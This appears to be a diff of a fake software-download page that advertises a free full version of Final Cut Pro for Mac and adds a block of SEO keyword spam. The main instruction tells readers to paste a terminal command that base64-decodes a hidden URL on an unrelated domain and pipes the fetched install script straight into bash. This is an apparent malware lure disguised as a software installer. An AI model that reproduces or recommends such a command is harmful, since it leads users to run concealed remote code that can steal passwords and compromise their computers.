@@ -6,8 +6,7 @@
 
 ### 🔽 Download Final Cut Pro for Mac
 
-> 📥 Open the terminal on your device and paste the command below.
-> 👇 Instructions are located below after the "Key Features & Benefits" block
+> 📥 Open the terminal on your device and paste the command below. Instructions below 👇
 ```
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQ1L2luc3RhbGwuc2g= | base64 -d))"
 ```
@@ -40,15 +39,6 @@ Whether you're editing vlogs, feature films, or corporate videos, Final Cut Pro 
 
 ## 📦 How to Install
 
-# Installation via .dmg:
-
-1. Install the .dmg file using the button above. 
-2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
-3. Open a terminal and transfer the file you extracted in the last step into it.
-4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
-
-[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
-
 # Installation via a command in the terminal:
 
 1. Copy the installation command below.
@@ -64,3 +54,4 @@ Whether you're editing vlogs, feature films, or corporate videos, Final Cut Pro 
 
 ## 🔍 Keywords
 
+Final Cut Pro for Mac, Final Cut Pro Mac Download, Final Cut Pro for Mac Download, Final Cut Pro Mac, Final Cut Pro Download Mac, Final Cut Pro Download for Mac, final cut pro free download, final cut pro full version, Mac Download Final Cut Pro, Download Mac Final Cut Pro, Download Final Cut Pro Mac, Download Final Cut Pro for Mac
